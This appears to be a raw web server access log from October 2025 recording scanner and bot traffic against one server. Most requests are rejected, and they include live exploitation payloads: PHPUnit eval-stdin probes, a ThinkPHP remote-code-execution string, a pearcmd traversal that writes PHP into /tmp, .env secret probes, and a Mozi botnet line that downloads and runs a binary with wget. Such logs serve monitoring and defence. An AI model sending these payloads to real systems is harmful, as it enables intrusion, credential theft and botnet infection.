103.152.255.223 - - [17/Oct/2025:22:12:50 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:51 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:52 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:53 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:55 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:56 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:56 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:57 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:58 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:58 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:59 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:59 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:59 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:00 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:01 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:01 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:02 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:03 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:04 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:04 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:05 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:06 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:09 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:09 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:10 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:11 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:12 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:13 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:13 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:14 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:15 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:16 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:16 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:17 +0000] "GET /index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:19 +0000] "GET /public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:21 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\x22hi\x22));?>+/tmp/index1.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:21 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:22 +0000] "GET /containers/json HTTP/1.1" 400 154 "-" "libredtail-http" "-"
20.221.57.26 - - [17/Oct/2025:22:17:41 +0000] "GET /portal/redlion HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
87.121.84.17 - - [17/Oct/2025:22:54:29 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
138.36.155.73 - - [17/Oct/2025:23:00:02 +0000] "GET /robots.txt HTTP/1.0" 400 143 "-" "xfa1" "-"
204.76.203.219 - - [17/Oct/2025:23:05:00 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
20.55.88.105 - - [17/Oct/2025:23:26:26 +0000] "GET /developmentserver/metadatauploader HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
34.78.245.104 - - [17/Oct/2025:23:35:21 +0000] "GET / HTTP/1.1" 400 154 "-" "python-requests/2.32.5" "-"
131.196.48.84 - - [18/Oct/2025:00:35:43 +0000] "GET /robots.txt HTTP/1.0" 400 143 "-" "xfa1" "-"
107.170.42.197 - - [18/Oct/2025:00:45:05 +0000] "GET /get_config.php HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
87.121.84.17 - - [18/Oct/2025:00:58:29 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
204.76.203.219 - - [18/Oct/2025:00:58:37 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
176.65.141.226 - - [18/Oct/2025:01:12:48 +0000] "GET /login.rsp HTTP/1.1" 400 154 "-" "Hello World" "-"
93.174.93.12 - - [18/Oct/2025:01:19:01 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 150 "-" "-" "-"
93.174.93.12 - - [18/Oct/2025:01:20:30 +0000] "GET / HTTP/1.0" 400 143 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 MicroMessenger/7.0.5(0x17000523) NetType/WIFI Language/zh_CN" "-"
64.31.4.73 - - [18/Oct/2025:01:29:14 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
64.31.4.73 - - [18/Oct/2025:01:29:14 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
87.121.84.17 - - [18/Oct/2025:02:22:07 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
155.254.61.79 - - [18/Oct/2025:02:50:11 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
155.254.61.79 - - [18/Oct/2025:02:50:11 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
3.130.96.91 - - [18/Oct/2025:02:53:27 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36" "-"
3.130.96.91 - - [18/Oct/2025:02:58:26 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03*\xDD\x0B4\xEB\x0C\xADh\xC3\xA2\xC1b\xBB]Vv\xFD\xA9\xA0\x15\x07\xD7\x09nh(\xD0%\x02\xCD\x18;\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-" "-"
204.76.203.219 - - [18/Oct/2025:02:59:41 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
3.130.96.91 - - [18/Oct/2025:03:00:20 +0000] "SSH-2.0-Go" 400 150 "-" "-" "-"
3.130.96.91 - - [18/Oct/2025:03:00:38 +0000] "" 400 0 "-" "-" "-"
3.130.96.91 - - [18/Oct/2025:03:02:50 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xC6\x1CI\xA4\x87\xA6\xC3\x96\x918\xA5G\xED\xCA\xF6y\xA7\xC8\xC48\xCC\xA5\xFD\x9DA\xDE\x9D\xD8\xDCH+\x12\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-" "-"
176.65.141.226 - - [18/Oct/2025:03:03:36 +0000] "GET /login.rsp HTTP/1.1" 400 154 "-" "Hello World" "-"
184.105.139.68 - - [18/Oct/2025:04:29:16 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03H" 400 150 "-" "-" "-"
87.121.84.17 - - [18/Oct/2025:04:37:20 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
163.47.34.82 - - [18/Oct/2025:04:43:01 +0000] "GET /robots.txt HTTP/1.0" 400 143 "-" "xfa1" "-"
45.82.78.102 - - [18/Oct/2025:04:45:11 +0000] "\x16\x03\x01\x05\xA8\x01\x00\x05\xA4\x03\x03\xD1\x99I\x82=\xB6\xC7\xFF\xEA\xE5#\xDF\x0B\x9CTU\x81\xD2u\xB0/Pe\x14\x9E\x92\x9C>\x01\xA6D\x9F \xA34J\xBC\xF8\x5C\xE2^<\xC0\xFF\xB7\xFBs4\x8A<\xEFc\xB6DR\x8ES\xE1\xFCW__,\x86F\x00\x1A\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 150 "-" "-" "-"
45.82.78.102 - - [18/Oct/2025:04:45:22 +0000] "\x16\x03\x01\x05\xA8\x01\x00\x05\xA4\x03\x03x\xA4\x16k\xBA\xEB\xC6\x85k\xF1y\xC8\x92\xD3\x1C\xFCe\xD1j\xB1`[\xCF\x9B\x9F\xF9\x11lgYI\xA6 \x9A" 400 150 "-" "-" "-"
45.82.78.102 - - [18/Oct/2025:04:45:22 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0" "-"
45.82.78.113 - - [18/Oct/2025:04:45:38 +0000] "GET /favicon.ico HTTP/1.1" 400 154 "http://3.149.120.21/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" "-"
61.0.87.14 - - [18/Oct/2025:04:58:23 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 150 "-" "-" "-"
204.76.203.219 - - [18/Oct/2025:04:59:37 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
20.65.192.150 - - [18/Oct/2025:05:24:26 +0000] "GET /manager/html HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
146.19.24.116 - - [18/Oct/2025:05:24:27 +0000] "GET / HTTP/1.1" 400 154 "-" "python-httpx/0.28.1" "-"
20.168.0.47 - - [18/Oct/2025:06:17:38 +0000] "MGLNDD_3.149.120.21_80" 400 150 "-" "-" "-"
87.121.84.17 - - [18/Oct/2025:06:31:29 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
155.254.34.8 - - [18/Oct/2025:06:41:27 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
155.254.34.8 - - [18/Oct/2025:06:41:27 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
204.76.203.219 - - [18/Oct/2025:06:48:06 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
194.187.176.146 - - [18/Oct/2025:07:13:49 +0000] "GET /DevicesGateway/apps/system-app-metadata/1?packageId=../../../../API/system/users/search%3fpagesize=1 HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" "-"
176.65.141.226 - - [18/Oct/2025:07:41:42 +0000] "GET /login.rsp HTTP/1.1" 400 154 "-" "Hello World" "-"
198.235.24.173 - - [18/Oct/2025:07:44:43 +0000] "GET / HTTP/1.0" 400 143 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity" "-"
170.106.192.3 - - [18/Oct/2025:07:49:45 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
43.135.144.126 - - [18/Oct/2025:07:50:00 +0000] "GET / HTTP/1.1" 200 400 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
139.59.20.185 - - [18/Oct/2025:08:08:42 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xFB\xB5\x95\xCB\xF6\xF3j\xE4\xF0U\xA0Ww\x03%\xA2s4Q\xAFH#=?\x95\xA3qq\x8A\xAD\xC9\x86\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-" "-"
139.59.20.185 - - [18/Oct/2025:08:08:42 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x031\x8D\x10o\x01?h\xF5Q\xF0\xB6b" 400 150 "-" "-" "-"
139.59.20.185 - - [18/Oct/2025:08:08:43 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
139.59.20.185 - - [18/Oct/2025:08:08:43 +0000] "GET /form.html HTTP/1.1" 400 154 "-" "curl/8.1.2" "-"
139.59.20.185 - - [18/Oct/2025:08:08:44 +0000] "GET /upl.php HTTP/1.1" 400 154 "-" "Mozilla/5.0" "-"
139.59.20.185 - - [18/Oct/2025:08:08:44 +0000] "GET /t4 HTTP/1.1" 400 154 "-" "Mozilla/5.0" "-"
139.59.20.185 - - [18/Oct/2025:08:08:45 +0000] "GET /geoip/ HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
139.59.20.185 - - [18/Oct/2025:08:08:45 +0000] "GET /favicon.ico HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
139.59.20.185 - - [18/Oct/2025:08:08:46 +0000] "GET /1.php HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
139.59.20.185 - - [18/Oct/2025:08:08:46 +0000] "GET /systembc/password.php HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
139.59.20.185 - - [18/Oct/2025:08:08:47 +0000] "GET /password.php HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
87.121.84.17 - - [18/Oct/2025:08:12:42 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
204.76.203.219 - - [18/Oct/2025:08:56:45 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
220.167.232.154 - - [18/Oct/2025:09:05:41 +0000] "GET / HTTP/1.1" 400 154 "-" "-" "-"
183.93.86.84 - - [18/Oct/2025:09:07:01 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36" "-"
45.58.127.135 - - [18/Oct/2025:09:13:06 +0000] "GET /robots.txt HTTP/1.0" 400 143 "-" "xfa1" "-"
198.235.24.48 - - [18/Oct/2025:09:45:31 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xD9\xBE\x03\xD0^\xB1\xE7L&OqQ\xCCv\xE5\xC2\xCC)\xF5\x15|\xE7\x96\xC0\x5C\xB6e\xCA\x0F\x9D\x16+\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 150 "-" "-" "-"
198.235.24.48 - - [18/Oct/2025:09:45:31 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x17\x1C\xA0\x22>" 400 150 "-" "-" "-"
64.137.96.150 - - [18/Oct/2025:09:48:05 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
64.137.96.150 - - [18/Oct/2025:09:48:05 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
93.174.93.12 - - [18/Oct/2025:10:10:35 +0000] "GET / HTTP/1.0" 400 143 "-" "Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1" "-"
87.121.84.17 - - [18/Oct/2025:10:18:33 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
204.76.203.212 - - [18/Oct/2025:10:30:25 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
198.235.24.33 - - [18/Oct/2025:10:36:20 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x8D\xB6 QVSg\xED9\x18\xFDu\x8A\xA7\x9BH@Hv\xD3\x01\xD3D\xFA\xBF\xC8\xD9\x8B\xB2y\xD2\x0C\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 150 "-" "-" "-"
198.235.24.33 - - [18/Oct/2025:10:36:20 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03)+\xA3\xC6\x9A\xBD\x97>\xD38g=\xA5 \xAD\xD6;\x1C\x16\x9D" 400 150 "-" "-" "-"
167.94.138.186 - - [18/Oct/2025:10:51:20 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
167.94.138.186 - - [18/Oct/2025:10:51:20 +0000] "PRI * HTTP/2.0" 400 150 "-" "-" "-"
167.94.138.186 - - [18/Oct/2025:10:51:23 +0000] "PRI * HTTP/2.0" 400 150 "-" "-" "-"
167.94.138.186 - - [18/Oct/2025:10:51:23 +0000] "GET /security.txt HTTP/1.1" 400 154 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
204.76.203.219 - - [18/Oct/2025:11:01:40 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
87.121.84.17 - - [18/Oct/2025:11:45:57 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
82.23.235.210 - - [18/Oct/2025:11:47:54 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
82.23.235.210 - - [18/Oct/2025:11:47:55 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
86.54.31.40 - - [18/Oct/2025:11:56:05 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" "-"
86.54.31.40 - - [18/Oct/2025:11:56:05 +0000] "GET /robots.txt HTTP/1.1" 400 154 "-" "-" "-"
86.54.31.40 - - [18/Oct/2025:11:56:06 +0000] "GET /sitemap.xml HTTP/1.1" 400 154 "-" "-" "-"
86.54.31.40 - - [18/Oct/2025:11:56:07 +0000] "GET /.well-known/security.txt HTTP/1.1" 400 154 "-" "-" "-"
86.54.31.40 - - [18/Oct/2025:11:56:10 +0000] "GET /favicon.ico HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36" "-"
165.154.182.92 - - [18/Oct/2025:12:06:52 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 9_1_1; Win64; x64) AppleWebKit/538.54 (KHTML, like Gecko) Chrome/68.0.132 Safari/537.36" "-"
165.154.182.92 - - [18/Oct/2025:12:06:52 +0000] "GET /favicon.ico HTTP/1.1" 400 154 "-" "Go-http-client/1.1" "-"
165.154.182.92 - - [18/Oct/2025:12:06:52 +0000] "GET /robots.txt HTTP/1.1" 400 154 "-" "Go-http-client/1.1" "-"
165.154.182.92 - - [18/Oct/2025:12:06:52 +0000] "GET /sitemap.xml HTTP/1.1" 400 154 "-" "Go-http-client/1.1" "-"
204.76.203.219 - - [18/Oct/2025:12:45:02 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
170.106.143.6 - - [18/Oct/2025:12:46:12 +0000] "GET / HTTP/1.1" 200 400 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
195.96.129.4 - - [18/Oct/2025:12:53:19 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
66.249.69.200 - - [18/Oct/2025:13:16:26 +0000] "GET /301-689-3295 HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.207 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
87.121.84.17 - - [18/Oct/2025:13:30:16 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
